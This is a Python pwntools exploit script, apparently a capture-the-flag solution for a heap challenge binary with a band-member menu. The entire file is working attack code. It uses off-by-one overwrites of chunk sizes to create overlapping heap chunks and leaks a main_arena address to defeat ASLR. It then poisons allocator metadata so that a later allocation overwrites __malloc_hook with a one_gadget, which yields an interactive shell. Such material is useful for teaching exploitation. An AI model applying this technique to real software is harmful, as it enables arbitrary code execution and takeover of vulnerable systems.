# exploit_problem.py

from pwn import *

p = process('./problem')

offset_mallochook = 0x1e4c30 # offset of &__malloc_hook from libc base
offset_mainarena = 0x1e4c40 # offset of main_arena() from libc base
offset_onegadget = 0x106ef8 # offset of one_gadget from libc base

def See():
    p.recvuntil(">\n")
    p.sendline("1")

def Join(wannabe, memo):
    p.recvuntil(">\n")
    p.sendline("2")
    p.recvuntil(">\n")
    p.sendline(str(wannabe))
    p.recvuntil("> ")
    p.send(memo)

def BeSavior(index):
    p.recvline(">\n")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(index))

Join(1,"\n") # index: 0, Vocal 1
Join(2, "\n") # index: 1, Guitar 1
Join(5, "\n") # index: 2, Keyboard 1
Join(1, "\n") # index: 3, Vocal 2
Join(6, "\n") # index: 4, Trumpet 1

for i in range(3):
    Join(3, "\n") # index: 5,6,7, Bassist 3

for i in range(3):
    Join(5, "\n") # index: 8,9,10, Keyboard 4

BeSavior(5)
BeSavior(6)
BeSavior(7)
BeSavior(8)
BeSavior(9)
BeSavior(10)

BeSavior(3) 
Join(1, "A"*0x17+"\xc1") # index: 11, Vocal 3
BeSavior(4)

BeSavior(2) # unsortbin

BeSavior(1)
BeSavior(0)
Join(1, "A"*0x17+"\x61") # index: 12, Vocal 4
BeSavior(1)
Join(4, "A"*0x3e+"\n") # index: 13, Drummer 1
pause()
See()
p.recvuntil("Drum : ")
p.recvline()
addr_mainarena = u64(p.recv(6).ljust(8, "\x00")) - 96 # address of main_arena()
log.info("address of main_arena(): " + hex(addr_mainarena))
addr_libc = addr_mainarena - offset_mainarena # address of libc base
log.info("address of libc base: " + hex(addr_libc))
addr_mallochook = addr_libc + offset_mallochook # address of &__malloc_hook
log.info("address of malloc hook: " + hex(addr_mallochook))
addr_onegadget = addr_libc + offset_onegadget # address of one_gadget

BeSavior(13)
Join(2, p64(addr_mallochook)[1:]+"\n") # index: 14, Guitar 2
Join(6, "\n") # index: 15, Trumpet 2
Join(4, "A"*0x2f+p64(addr_onegadget)+"\n") # index: 16, Drummer 2

# Get shell
p.recvuntil(">\n")
p.sendline("2")
p.recvuntil(">\n")
p.sendline("6") # index: 17, Trumpet 3

p.interactive()